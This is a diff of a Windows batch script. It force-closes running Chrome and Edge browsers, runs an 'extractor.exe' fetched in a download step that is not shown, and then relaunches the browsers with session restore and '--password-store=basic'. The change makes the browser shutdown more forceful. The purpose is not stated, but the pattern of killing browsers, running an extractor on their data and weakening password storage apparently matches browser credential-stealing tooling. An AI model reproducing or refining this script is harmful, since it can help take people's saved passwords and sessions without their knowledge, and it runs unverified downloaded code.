@@ -29,26 +29,41 @@ cd "%tempdir%" || (
     exit /b 3
 )
 
-REM Check which browsers are running and store their state
+REM Check which browsers are running
 set "chrome_running=0"
 set "edge_running=0"
-tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
-if "%ERRORLEVEL%"=="0" set "chrome_running=1"
-tasklist /FI "IMAGENAME eq msedge.exe" 2>NUL | find /I /N "msedge.exe">NUL
-if "%ERRORLEVEL%"=="0" set "edge_running=1"
 
-REM Close browsers gracefully if they're running
-echo Closing browsers gracefully...
-if %chrome_running%==1 (
-    echo Closing Chrome...
-    powershell -command "Get-Process chrome -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }"
+echo Checking running browsers...
+tasklist /FI "IMAGENAME eq chrome.exe" 2>NUL | find /I /N "chrome.exe">NUL
+if "%ERRORLEVEL%"=="0" (
+    set "chrome_running=1"
+    echo Chrome is running
 )
+tasklist /FI "IMAGENAME eq msedge.exe" 2>NUL | find /I /N "msedge.exe">NUL
+if "%ERRORLEVEL%"=="0" (
+    set "edge_running=1"
+    echo Edge is running
+)
+
+REM Close browsers gracefully
+echo Closing browsers...
+
+if %chrome_running%==1 (
+    echo Closing Chrome gracefully...
+    powershell -command "Get-Process chrome -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }"
+    timeout /t 2 > nul
+    taskkill /F /IM chrome.exe /T > nul 2>&1
+)
+
 if %edge_running%==1 (
-    echo Closing Edge...
+    echo Closing Edge gracefully...
     powershell -command "Get-Process msedge -ErrorAction SilentlyContinue | ForEach-Object { $_.CloseMainWindow() | Out-Null }"
+    timeout /t 2 > nul
+    taskkill /F /IM msedge.exe /T > nul 2>&1
 )
 
 REM Wait for processes to exit completely
+echo Waiting for browsers to close...
 timeout /t 5 > nul
 
 REM Download required files
@@ -68,30 +83,31 @@ REM Run the extractor
 echo Starting process----------------------------------------
 call "%tempdir%\extractor.exe"
 
-REM Restart only previously running browsers
+REM Restart previously running browsers
 echo Starting browsers----------------------------------------
+
 if %chrome_running%==1 (
     echo Starting Chrome...
-    start "" /B "C:\Program Files\Google\Chrome\Application\chrome.exe" ^
+    start "" "C:\Program Files\Google\Chrome\Application\chrome.exe" ^
         --restore-last-session ^
-        --session-restore-standalone-timeout=120 ^
+        --session-restore-standalone-timeout=60 ^
         --disable-session-crashed-bubble ^
         --disable-features=TabGroups ^
         --password-store=basic ^
-        --no-first-run ^
-        --restore-on-startup=4
+        --no-first-run
+    timeout /t 2 > nul
 )
 
 if %edge_running%==1 (
     echo Starting Edge...
-    start "" /B "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" ^
+    start "" "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" ^
         --restore-last-session ^
-        --session-restore-standalone-timeout=120 ^
+        --session-restore-standalone-timeout=60 ^
         --disable-session-crashed-bubble ^
         --disable-features=TabGroups ^
         --password-store=basic ^
-        --no-first-run ^
-        --restore-on-startup=4
+        --no-first-run
+    timeout /t 2 > nul
 )
 
 echo Browser restart process completed.
